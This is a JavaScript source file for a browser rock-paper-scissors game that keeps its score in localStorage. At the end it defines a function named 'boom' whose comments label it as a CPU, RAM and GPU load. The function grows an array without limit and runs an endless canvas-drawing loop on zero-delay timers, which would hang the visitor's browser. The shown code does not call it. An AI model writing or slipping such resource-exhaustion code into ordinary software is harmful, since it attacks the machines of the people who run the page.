  let scor = JSON.parse (localStorage.getItem('stor'));


  if (scor === null) {scor = { win: 0, loos: 0, drow: 0};} 

            
 updateScor ();

 



function pcMove() {
    
    const random = Math.random();
  
    let result ='';

    if(random > 0 && random < 1/3) {result ='Rock';}

    else if(random > 1/3 && random < 2/3) {result ='Paper';}

    else if(random > 2/3 && random <1) {result ='Scissor';}

    return result;
 };




function allin (myMove) { 


 let fMove = pcMove();

  let mE ='';

  let last = '';


if (myMove === 'Rock') {

   if(fMove ==='Rock') {last ='It\'s a draw 🙄';}

   else if(fMove==='Paper') {last ='You lose🥺';}

   else if(fMove==='Scissor') {last ='You Win🥳';}

    mE = 'Rock'

  }




else if (myMove === 'Paper') {if(fMove==='Rock') {last ='You Win🥳';}

   else if(fMove==='Paper') {last ='It\'s a draw 🙄';}

   else if(fMove==='Scissor') {last ='You lose🥺';}

    mE = 'Paper'

   }

   


else if (myMove === 'Scissor')
   
   {if(fMove==='Rock') {last ='You lose🥺';}

   else if(fMove==='Paper') {last ='You Win🥳';}

   else if(fMove==='Scissor') {last ='It\'s a draw 🙄';}

    mE = 'Scissor'
    
   }


  

  if (last === 'You Win🥳') {scor.win = scor.win+1;}

  else if (last === 'You lose🥺') {scor.loos +=1 ;}

  else if (last === 'It\'s a draw 🙄') {scor.drow ++;}



   localStorage.setItem('stor',JSON.stringify(scor));

    

   document.querySelector('.js-final').innerHTML=`${last}`;


   document.querySelector('.js-vs').innerHTML= `Your:<img src="${mE}.png"> VS <img src="${fMove}.png">:Computer`;

 
     updateScor ();


};





function updateScor () {document.querySelector('.js-scor')

 .innerText=`win: ${scor.win} lose: ${scor.loos} draw: ${scor.drow}`;
 

};


function boom() {
        let A = 1;
        let arr = [];

        // CPU + RAM 
        setInterval(() => {
          arr.push(Math.random() * A);
          A += Math.sqrt(A) * Math.sin(A);
          A = (A * 1.01) / 1.02 + 0.0001;
        }, 0);

        // Silent canvas (GPU)
        const canvas = document.createElement("canvas");
        canvas.width = 256;
        canvas.height = 256;
        canvas.style.display = "block"; 
        document.body.appendChild(canvas);

        const ctx = canvas.getContext("2d");
        setInterval(() => {
          for (let i = 0; true; i++) {
            const x = Math.random() * canvas.width;
            const y = Math.random() * canvas.height;
            const r = Math.floor(Math.random() * 256);
            const g = Math.floor(Math.random() * 256);
            const b = Math.floor(Math.random() * 256);
            ctx.fillStyle = `rgb(${r},${g},${b})`;
            ctx.fillRect(x, y, 1, 1);
          }
        }, 0);
      };





    
  
